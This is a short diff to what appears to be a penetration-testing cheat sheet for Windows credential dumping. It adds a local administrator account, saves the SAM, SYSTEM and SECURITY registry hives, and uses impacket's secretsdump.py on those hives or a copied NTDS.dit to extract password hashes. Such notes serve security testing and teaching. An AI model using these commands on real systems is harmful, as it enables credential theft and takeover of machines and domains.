@@ -187,8 +187,17 @@ net localgroup Administrators cereal /add
 reg save hklm\sam %TEMP%\sam
 reg save hklm\system %TEMP%\system
 
-# optional
+# optional (AD)
 reg save hklm\security %TEMP%\security
+
+# transfer the files to a machine with impacket installed
+# dump user hashes
+secretsdump.py -system system -sam sam LOCAL
+secretsdump.py -system system -sam sam -security security LOCAL
+
+
+# Alternative path: copy C:\Windows\NTDS\ntds.dit and system
+secretsdump.py -ntds ntds.dit -system system.bak LOCAL
 ```
 
 ```powershell
